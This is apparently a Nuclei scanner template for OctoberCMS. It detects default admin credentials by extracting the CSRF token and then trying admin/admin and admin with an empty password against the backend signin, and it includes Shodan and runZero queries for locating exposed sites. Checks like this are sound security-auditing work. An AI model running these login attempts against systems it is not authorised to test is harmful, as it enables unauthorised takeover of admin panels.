id: octobercms-default-login
info:
  name: OctoberCMS - Default Admin Discovery
  author: princechaddha
  severity: high
  description: OctoberCMS default admin credentials were discovered.
  reference:
    - https://github.com/octobercms/october
    - https://octobercms.com/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:octobercms:october:*:*:*:*:*:*:*:*
  metadata:
    runzero-match: service["favicon.ico.image.mmh3"] == "3823102"
    max-request: 4
    product: october
    shodan-query: http.component:"October CMS"
    vendor: octobercms
    verified: true
  tags: default-login,octobercms,oss,vuln
http:
  - attack: clusterbomb
    extractors:
      - group: 1
        internal: true
        name: token
        part: body
        regex:
          - meta name="csrf\-token" content="([A-Za-z0-9]+)">
        type: regex
    matchers:
      - condition: and
        part: header
        type: word
        words:
          - october_session=
          - admin_auth=
      - status:
          - 302
        type: status
    matchers-condition: and
    payloads:
      password:
        - admin
        - ""
      username:
        - admin
    raw:
      - |
        GET /backend/backend/auth/signin HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
      - |
        POST /backend/backend/auth/signin HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Content-Type: application/x-www-form-urlencoded

        _token={{token}}&postback=1&login={{username}}&password={{password}}
